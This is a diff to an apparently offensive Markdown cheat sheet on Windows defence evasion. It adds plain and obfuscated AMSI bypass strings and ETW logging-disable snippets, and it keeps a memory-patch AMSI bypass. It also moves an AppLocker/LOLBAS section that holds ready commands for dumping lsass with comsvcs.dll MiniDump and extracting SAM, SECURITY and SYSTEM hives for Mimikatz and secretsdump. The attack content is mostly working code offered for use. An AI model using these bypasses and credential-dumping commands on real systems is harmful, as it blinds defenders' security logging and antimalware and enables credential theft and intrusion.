@@ -2,14 +2,14 @@
 ## Index
 * [General](#General)
 * [PowerShell](#PowerShell)
-	* [Execution-policy](#Execution-policy)
-	* [AMSI](#AMSI)
-	* [Constrained Language Mode](#Constrained-Lanuage-Mode)
-		* [Escapes for Constrained Lanuage Mode](#Escapes-for-Constrained-Language-Mode)
-	* [Applocker](#Applocker)
-		* [LOLBAS](#LOLBAS)
-	* [Logging evasion](#Logging-evasion)
-	* [Just Enough Admin](#Just-Enough-Admin)
+   * [Execution-policy](#Execution-policy)
+   * [AMSI](#AMSI)
+   * [Constrained Language Mode](#Constrained-Lanuage-Mode)
+      * [Escapes for Constrained Lanuage Mode](#Escapes-for-Constrained-Language-Mode)
+   * [Logging evasion](#Logging-evasion)
+   * [Just Enough Admin](#Just-Enough-Admin)
+* [Applocker](#Applocker)
+  * [LOLBAS](#LOLBAS)
 * [Windows Defender](#Windows-Defender)
 * [Defeating AV](#Defeating-AV)
   * [Obfuscation tools](#Obfuscation-tools)
@@ -57,20 +57,21 @@ powershell.exe -executionpolicy bypass
 - https://amsi.fail/
 - Get an AMSI bypass string and then obfuscate [manually](#Obfuscation-techniques)
 
-### Method 1
-#### Amsi bypass string obfuscated
+#### AMSI bypass string
+```
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+#### AMSI bypass string obfuscated
 ```
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
-#### Generating a new string
-- Use the string below
 ```
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
 ```
-- Fuck around with invoke-obfuscation till it doesn't get detected anymore
 
-### Method 2
+#### AMSI bypass string 2 obfuscated
 ```
 $MethodDefinition = @"
 [DllImport(`"kernel32`",  EntryPoint="GetProcAddress")]
@@ -94,11 +95,19 @@ $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0
 [system.runtime.interopservices.marshal]::copy($buf, 0, $BAddress, 6);
 ```
 
-#### Creating scripts that bypass amsi
-- Remove all comments + whitespaces http://www.powertheshell.com/
-- Check for amsi strings https://github.com/RythmStick/AMSITrigger
-- Then obfuscate strings with https://github.com/danielbohannon/Invoke-Obfuscation
-- Repeat
+### ETW
+- Event Tracing for Windows
+- Very effective way of hunting .NET
+- Reflectivly modify the PowerShell process to prevent events being published. ETW feeds ALL of the other logs so this disabled everything!
+
+```
+[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static'); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);
+```
+
+#### Obfusacted
+```
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
+```
 
 ### Constrained Lanuage Mode
 #### Check the language mode
@@ -154,97 +163,9 @@ certutil -urlcache -split -f <URL>
 - It is possible to execute scripts on the filesystem but you can't load them!
 - If applocker is there enumerate it to find a directory that lets you execute scripts in
 
-### Applocker
-- AppLocker rules are split into 5 categories - Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement (enforced, audit only, none).
-- AppLocker has a set of default allow rules such as, "allow everyone to execute anything within C:\Windows\*" - the theory being that everything in C:\Windows is trusted and safe to execute.
-- The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:
-  - Executing untrusted code via trusts LOLBAS's.
-  - Finding writeable directories within "trusted" paths.
-  - By default, AppLocker is not even applied to Administrators.
-- Uploading into ```C:\Windows``` requires elevated privileges, but there are places like ```C:\Windows\Tasks``` that are writeable by standard users. 
-- DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.
-- Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList
-
-#### Check if applocker policy is running
-```
-Get-AppLockerPolicy -Effective
-```
-
-#### Enumerate applocker policy
-```
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-```
-
-#### Check applocker policy in registery
-```
-reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
-```
-
-#### Check policy with GPOresult
-- Open the HTLM file locally
-```
-gpresult /H gpos.html
-```
-
-#### Parse GPO applocker
-- https://github.com/PowerShell/GPRegistryPolicy
-```
-Get-DomainGPO -Identity *applocker*
-Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
-```
-
-#### Check for WDAC
-```
-Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
-```
-
-#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
-```
-runas /netonly /user:<DOMAIN\<USER> cmd.exe
-winrs -r:<PC NAME> cmd
-```
-
-#### Check for the policy
-- ```.p7b``` is a signed policy
-- Check if there are any ```.xml``` files which didn't got removed with the policy
-```
-ls C:\Windows\system32\CodeIntegrity
-```
-
-### LOLBAS
-- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/
-
-#### rundll32.exe and comsvcs.dll dumping lsass:
-```
-Get-Process | Select-String lsass
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
-dir C:\Users\Public\lsass.dmp
-
-Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
-```
-
-#### Rex.exe dumping sam
-```
-reg save HKLM\SECURITY security.bak
-reg save HKLM\SYSTEM system.bak
-reg save HKLM\SAM sam.bak
-
-Invoke-Mimikatz -Command '"lsadump::sam system.bak sam.bak"'
-secretsdump.py -sam sam.bak -security security.bak -system system.bak local
-```
-
 ### Logging evasion
-#### Script Block logging bypass string obfuscated
-```
-[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
-```
-
-#### Generating a new string
-- Use the string below
-```
-[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static'); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);
-```
-- Fuck around with invoke-obfuscation till it doesn't get detected anymore
+#### Script Block logging bypass
+- Bypass [ETW](#ETW)
 
 ### System Wide Transcript
 #### Invisi-shell
@@ -365,6 +286,85 @@ Get-PSSessionConfiguration
 $sess2 = New-PSSession -ComputerName <FQDN> -Credential $creds2 -ConfigurationName <RECONFIGURED ENDPOINT>
 Enter-PSSession $sess
 Get-PSSessionConfiguration
+```
+
+## Applocker
+- AppLocker rules are split into 5 categories - Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement (enforced, audit only, none).
+- AppLocker has a set of default allow rules such as, "allow everyone to execute anything within C:\Windows\*" - the theory being that everything in C:\Windows is trusted and safe to execute.
+- The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:
+  - Executing untrusted code via trusts LOLBAS's.
+  - Finding writeable directories within "trusted" paths.
+  - By default, AppLocker is not even applied to Administrators.
+- Uploading into ```C:\Windows``` requires elevated privileges, but there are places like ```C:\Windows\Tasks``` that are writeable by standard users. 
+- DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.
+- Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList
+
+#### Check if applocker policy is running
+```
+Get-AppLockerPolicy -Effective
+```
+
+#### Enumerate applocker policy
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+#### Check applocker policy in registery
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+```
+
+#### Check policy with GPOresult
+- Open the HTLM file locally
+```
+gpresult /H gpos.html
+```
+
+#### Parse GPO applocker
+- https://github.com/PowerShell/GPRegistryPolicy
+```
+Get-DomainGPO -Identity *applocker*
+Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
+```
+
+#### Check for WDAC
+```
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+```
+
+#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
+```
+runas /netonly /user:<DOMAIN\<USER> cmd.exe
+winrs -r:<PC NAME> cmd
+```
+
+#### Check for the policy
+- ```.p7b``` is a signed policy
+- Check if there are any ```.xml``` files which didn't got removed with the policy
+```
+ls C:\Windows\system32\CodeIntegrity
+```
+
+### LOLBAS
+- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/
+
+#### rundll32.exe and comsvcs.dll dumping lsass:
+```
+Get-Process | Select-String lsass
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
+dir C:\Users\Public\lsass.dmp
+
+Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
+```
+
+#### Rex.exe dumping sam
+```
+reg save HKLM\SECURITY security.bak
+reg save HKLM\SYSTEM system.bak
+reg save HKLM\SAM sam.bak
+
+Invoke-Mimikatz -Command '"lsadump::sam system.bak sam.bak"'
+secretsdump.py -sam sam.bak -security security.bak -system system.bak local
 ```
 
 ## Windows Defender
